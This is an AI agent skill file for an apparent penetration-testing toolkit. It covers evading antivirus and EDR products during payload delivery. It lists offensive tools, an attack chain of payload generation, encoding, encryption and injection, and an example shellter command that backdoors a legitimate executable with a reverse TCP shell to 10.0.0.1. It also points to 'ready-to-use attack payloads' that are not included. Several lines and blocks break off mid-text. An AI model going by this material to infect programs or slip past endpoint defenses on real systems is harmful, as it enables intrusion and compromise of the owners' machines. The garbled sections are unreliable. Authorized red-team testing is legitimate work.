---
name: chiper-av-edr-evasion
description: "Use when AV/EDR evasion covers techniques for bypassing antivirus (AV) and Endpoint Detection/Response (EDR) solutions during payload delivery, execution, and post-exploitat"
version: "0.2.0"
author: Chiper (Chiper-Cyber)
metadata:
  Chiper:
    tags: [pentest, security, kali-linux, chiper-cyber, edr, evasion]
references:
  - path: ~/.Chiper/skills/chiper-cyber/chiper-av-edr-evasion/SKILL.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-av-edr-evasion/payloads.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-av-edr-evasion/test-cases.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-av-edr-evasion/guides
---

# Av Edr Evasion

## Prerequisites

> 💡 Missing tools? This skill will auto-check before execution.

**Required tools:**

- `msfvenom` — install: `sudo apt install -y metasploit-framework`

**Quick check (run before using this skill):**

```bash
# Check which tools are missing
MISSING=""
for cmd in msfvenom; do
  command -v "$cmd" >/dev/null 2>&1 || MISSING="$MISSING $cmd"
done
if [ -n "$MISSING" ]; then
  echo "⚠️  Missing tools:$MISSING"
  echo "Install with:"
  command -v msfvenom >/dev/null 2>&1 || echo "  sudo apt install -y metasploit-framework"
else
  echo "✅ All tools installed"
fi
```

## When to Use

Av Edr Evasion skill domain covering exploitation operations.

**Tools**: shellter, veil, msfvenom, donut, pe2shc, hyperion, crypter

**Domain**: exploitation

**MITRE ATT&CK**: TA0005-Defense Evasion

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **shellter** | PE file infection with shellcode injection (preserves original functionality) | `shellter --file legit.exe --payload reverse_tcp --lhost 10.0.0.1 --lport 4444` |
| **veil** | Evasion framework generating obfus

## Methodology Overview

### Attack Chain

```
[1] Assess               [2] Prepare              [3] Obfuscate
  - Identify AV/EDR        - Generate base           - Encode with msfvenom
  - Detection capabilities   payload (msfvenom/       encoders (multi-iteration)
  - Test baseline            custom shellcode)       - Encrypt with hyperion
  - Sandbox fingerprint    - Choose payload type     - Inject with shellter
    

## Instructions

Read the referenced chiper-cyber files for full methodology:
- **SKILL.md** — Step-by-step methodology, attack chain, tools, and defense perspective
- **payloads.md** — Ready-to-use attack payloads organized by type and technique
- **test-cases.md** — Structured test procedures with prerequisites and expected results
- **guides/** — Deep-dive learning materials and scripts

Full skill content at: `~/.Chiper/skills/chiper-cyber/chiper-av-edr-evasion/`

## Examples

See `payloads.md` in the referenced directory for ready-to-use attack payloads.

## Test Cases

See `test-cases.md` in the referenced directory for structured test procedures.

## Notes

- Source: Chiper-Cyber v1.0.0 — Security Skills Ecosystem (Chiper 2026)
- Defense Triple: Defense Perspective + Detection Methods + Evasion Techniques
- Update: `cd ~/.Chiper/skills/chiper-cyber && git pull`
